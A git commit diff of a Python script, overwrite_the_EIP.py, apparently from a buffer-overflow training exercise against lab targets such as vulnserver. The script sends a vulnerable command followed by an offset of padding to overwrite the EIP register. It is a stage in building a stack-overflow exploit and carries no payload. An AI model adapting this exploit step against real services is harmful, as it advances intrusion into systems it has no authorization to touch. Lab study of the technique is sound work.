6ac6a0baf2caa76fe74af5a4b3d1cc9574e83470
MJWyattCyber <66680297+MJWyattCyber@users.noreply.github.com>
2021-10-11 21:18:49 +0100

    Updated Overwrite
    moved to python3 and added encoding, also added offset variable to make code cleaner.

--- overwrite_the_EIP.py
+++ overwrite_the_EIP.py
@@ -1,19 +1,20 @@
-#!/usr/bin/python
+#!/usr/bin/env python3
 import sys, socket
 
-shellcode = "A" * 2003 + "B" * 4 #The 2003 is returned from the pattern_offset.rb module, provide the value this command returned.
+offset = 634 #This number is returned from the pattern_offset.rb module, provide the value this command returned.
+shellcode = "A" * offset + "B" * 4 
 
-address = '127.0.0.1' #CHANGE THIS
-port = 9999 #CHANGE THIS
-vulncommand = 'TRUN /.:/' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
+address = '10.10.211.46' #CHANGE THIS
+port = 1337 #CHANGE THIS
+vulncommand = 'OVERFLOW2 ' # CHANGE THIS, the vulnerable command that was found in the spiking section would go here
 
 try:
-	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-	s.connect((address,port))
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect((address,port))
 
-	s.send((vulncommand + shellcode))
-	s.close()
+        s.send(bytes(vulncommand + shellcode, "latin-1"))
+        s.close()
 
 except:
-	print "Error connecting to server"
-	sys.exit()
+        print("Error connecting to server")
+        sys.exit()
